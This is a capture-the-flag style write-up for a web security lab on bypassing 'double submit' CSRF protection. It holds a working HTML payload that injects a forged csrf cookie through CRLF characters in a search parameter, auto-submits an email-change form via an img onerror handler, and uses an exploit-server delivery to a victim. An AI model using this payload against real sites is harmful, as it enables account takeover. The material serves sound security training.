### Lab: CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Input from search field reflected in the _Set-Cookie_ header
```http
Set-Cookie: LastSearchTerm=aaaa; Secure; HttpOnly
```

2. The _csrf_ cookie is assigned after GET **/** and reflects the csrf token in the html body.  
The application checks if the token in the HTML page is the same in the cookie, if it does so the action is allowed.  
There is no control over the syntax of the token, using a made-up string like "fakecsrf" works. 

3. Payload*, stored and delivered
```html
<html>
    <body>
        <img src="URL/?search=test%0D%0ASet-Cookie%3A%20csrf%3Dfakecsrf%3B%20SameSite%3DNone" onerror=document.forms[0].submit()>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@yougothacked">
            <input required type="hidden" name="csrf" value="fakecsrf">
            <button type="submit">Update Email</button>
        </form>
    </body>
</html>
```

The semicolon after 'SameSite=None' is added by the web application as string terminator.

_____

Script notes:

- 3 - POST **/** on exploit-server
    params:
    - urlIsHttps: on
    - responseFile: /exploit
    - responseHead: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8
    - responseBody: *
    - formAction: STORE | DELIVER_TO_VICTIM